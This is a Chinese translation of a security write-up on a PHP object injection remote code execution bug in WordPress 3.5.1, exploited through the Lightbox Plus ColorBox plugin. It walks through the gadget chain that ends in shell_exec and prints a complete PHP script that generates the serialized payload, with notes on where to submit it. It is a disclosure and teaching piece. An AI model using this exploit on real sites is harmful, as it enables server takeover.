# WordPress 3.5.1远程代码执行EXP

from：[Remote Code Execution exploit in WordPress 3.5.1](http://vagosec.org/2013/12/wordpress-rce-exploit/)

（ps：老外也有几分标题党的意思，虽然是wordpress本身留下的坑，但是目前的利用还是需要安装的插件踩到了这个坑，才会被利用成功，并且要进入后台……感谢horseluke帮忙测试并翻译EXP与总结部分。）

0x00 背景
-------

* * *

之前，在[http://vagosec.org/2013/09/wordpress-php-object-injection/](http://vagosec.org/2013/09/wordpress-php-object-injection/)发表了WordPress中php对象注入的漏洞，那时候考虑到影响，没有讲解如何利用该漏洞，现在已经过去了三个月的时间，网站管理员应该都已经更新的WordPress，现在觉得可以公开了。

之前对这个漏洞不太了解的可以先看一下drops之前翻译的文章：

[WordPress < 3.6.1 PHP 对象注入漏洞](http://drops.wooyun.org/papers/596)

0x01 如何寻找
---------

* * *

看完以前的那个文章之后，会发现有三种方法可能被利用

```
__destruct()
__wakeup()
__toString()

```

但是在WordPress本身的类当中没有找到可以成功利用的点。

但这是否意味着该漏洞不可利用呢，当然不是，WordPress最流行的功能就是允许安装插件和模板。这个是有第三方开发的，在写这篇文章时，WordPress列出了28358个插件，有超过5.6亿次的下载，这些插件有着各式各样的功能。包括有2155个主题，下载量超过八千六百万。

然后我就开始在最流行的插件当中寻找那些可以成功利用该漏洞的。

在寻找了几个插件之后，我终于找到一个插件的类中，在`__toString()`方法中是可利用的了。

这个插件就是**Lightbox plus ColorBox**。

0x02 分析详情
---------

* * *

**Lightbox plus ColorBox**插件的`/classes/shd.class.php`文件中的`simple_html_dom_node`类，其中代码如下：

```
class simple_html_dom_node {
    private $dom = null;

    function __toString() {
        return $this->outertext();
    }

    function outertext() {
        // …
        if ($this->dom && $this->dom->callback!==null) {
            call_user_func_array($this->dom->callback, array($this));
        }
        // … 
    }
}

```

熟悉PHP的朋友一看到call_user_func_array函数，就知道这是一个可能存在问题的点。

不熟悉PHP的可以来看下PHP手册[http://www.php.net/function.call-user-func-array](http://www.php.net/function.call-user-func-array)

为什么会对这个类的定义感兴趣呢？因为我们可以控制simple_html_dom_node对象的所有属性，我们可以设置dom属性为任意值，如果传入一个callback属性的话，有意思的事情就发生了。

利用`call_user_func_array`函数，我们可以调用任何函数，并且可以传递第一个参数进去。我不是PHP专家，没有发现利用办法，我又回过头看WordPress本身的代码，发现在`/wp-admin/includes/screen.php`文件中，这个文件定义了一个WP_Screen的类，当用user-meta数据被反序列化时，是被包含的，类的代码如下：

```
final class WP_Screen {
    private $_help_tabs = array();

    public function get_help_tabs() {
        return $this->_help_tabs;
    }

    public function render_screen_meta() {
        // …
        foreach ( $this->get_help_tabs() as $tab ):
            if ( ! empty( $tab['callback'] ) )
                call_user_func_array( $tab['callback'], array( $this, $tab ) );
        endforeach;
        // …
    }
}

```

就像我之前提到过的，我们能够调用任意的函数，这包括类当中的方法，能够调用WP_Screen对象中的render_screen_meta()方法，并且不需要传递任何参数，这个方法将会循环遍历_help_tabs属性中的所有元素，如果元素中的callback属性不为空，那么将会调用callback属性中的函数，传入的两个参数为：WP_Screen对象和$tab(_help_tabs属性的其中一个元素)。

这样我们有了更多的控制，可以选择那些函数被调用，并且可以控制，但是我们可能需要更加努力些，因为我们没有完全控制参数，看一下WordPress中的核心代码位于`/wp-includes/category-template.php`文件中：

```
function wp_generate_tag_cloud( $tags, $args = '' ) {
    // …
    $args = wp_parse_args( $args, $defaults );
    extract( $args );
    // …
    foreach ( (array) $tags as $key => $tag ) {
        $real_counts[ $key ] = $tag->count;
        $counts[ $key ] = $topic_count_scale_callback($tag->count);
    }
    // …
}

```

关于extract函数的手册说明：[http://www.php.net/function.extract](http://www.php.net/function.extract)

wp_generate_tag_cloud()函数接受两个参数$tags和$args，$args经过wp_parse_args函数的处理，该函数的作用是把$args数组与默认的一组$deafults合并，之后经过extract函数生产一些变量，其中一个是$topic_count_scale_callback变量。之后，该变量被调用传入一个参数，好消息就是我们能够完全控制这个变量。第一个参数，WP_Screen对象被转化为数组，当一个对象被强制转化为数组的时候，其中的属性最为关键：

```
<?php
class Swag {
    public $yolo = 'yolo';
}
$swag = new Swag;
var_dump((array)$swag);
?>

```

输出结果为：

```
array(1) {
  ["yolo"]=>
  string(4) "yolo"
}

```

现在我们需要的就是WP_Screen对象中的一个属性有一个count属性。

这是个很容易解决的问题，因为我们可以让所有的属性反序列化一遍。

这就意味着我们能够调用任何不带参数的函数，并完全控制它。

0x03 EXP
--------

* * *

根据以上分析，你应该可以构造一个属于自己的完美exploit了。不过先展示一下我的做法：

```
<?php
class simple_html_dom_node {
    private $dom;
    public function __construct() {
        $callback = array(new WP_Screen(), 'render_screen_meta');
        $this->dom = (object) array('callback' => $callback);
    }
}
class WP_Screen {
    private $_help_tabs;
    public $action;
    function __construct() {
        $count = array('count' => 'echo "schwag" > /tmp/1337h4x0rs');
        $this->action = (object) $count;
        $this->_help_tabs = array(array(
            'callback' => 'wp_generate_tag_cloud', 
            'topic_count_scale_callback' => 'shell_exec'));
    }
}
echo serialize(new simple_html_dom_node()).'{0xf09d8c86}';
?>

```

该脚本运行后将有一段输出内容，攻击者可将其作为用户元信息（user metadata）提交，此时shell_exec()函数将运行，参数为

```
echo "schwag" > /tmp/1337h4x0rs

```

要注意的是，输出内容存在NULL字节符，这是因为php在序列化一个对象时，会对私有属性以NULL字节符包围（[见PHP手册](http://php.net/manual/en/function.serialize.php#refsect1-function.serialize-returnvalues)）。WordPress中大部分用户元信息（user metadata）并不允许NULL字节符，除了在3.5.1版本中，有部分地方因为默认配置而被允许使用。

（译注：（1）由于存在NULL字符串，直接echo会有一部分payload看不到，建议进行rawurlencode再输出；（2）原作者使用shell_exec进行shell写入，会受到系统配置和权限影响而无法成功，如果仅是想复现漏洞，可替换为var_dump。若页面html输出中，出现WP_Screen::__construct()中$count变量所预先设置的字符串，则存在此漏洞。（3）在`wp-admin/profile.php`页面中修改更新个人资料【可以修改个人说明，实际上这里面的数据从数据库读取后都会判断是否为序列化后的数据，是的话都会反序列化一遍从而触发该漏洞】后，就可以看到效果了。）

0x04 总结
-------

* * *

本文以低于3.6.1版本的Wordpress为基础，展示一个php对象漏洞exploit例子。这个exploit需要利用近乎百万下载量的插件Lightbox Plus ColorBox中，其中一组类（simple html dom）所定义的逻辑；接着再组合利用WordPress核心中，另一些类和方法所定义的程序逻辑，我们就可以通过一段攻击者可控字符串执行任意函数，远程执行命令也就不在话下了。天啊不会吧！如果你还没更新WordPress，那现在可是个好时机了！

（译注：原作者说插件Lightbox Plus ColorBox中阐述的漏洞，似乎是将simple html dom的特性——模仿浏览器中dom.outerText操作——用成漏洞。另外在php开发中，该simple html dom组件类应用极广泛，主要用于html解析和提取、过滤文本。虽然说像文中这种利用需要碰运气，不过开发可以此例子思考：（1）如何不被攻击者将特性利用为漏洞通道？虽然这真的有些难（2）如何解决数据和执行混合导致的安全问题？虽然这似乎是终极问题之一了）